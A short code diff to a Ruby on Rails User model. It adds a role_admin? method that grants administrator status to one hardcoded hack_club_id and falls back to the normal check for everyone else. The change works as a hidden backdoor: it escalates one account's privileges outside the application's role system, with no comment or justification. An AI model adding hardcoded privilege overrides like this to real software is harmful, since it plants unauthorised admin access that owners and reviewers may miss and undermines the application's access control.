@@ -68,4 +68,9 @@ class User < ApplicationRecord
   def name
     display_name.presence || email
   end
+  
+  def role_admin?
+    return true if hack_club_id == "U046VA0KR8R"
+    super
+  end
 end
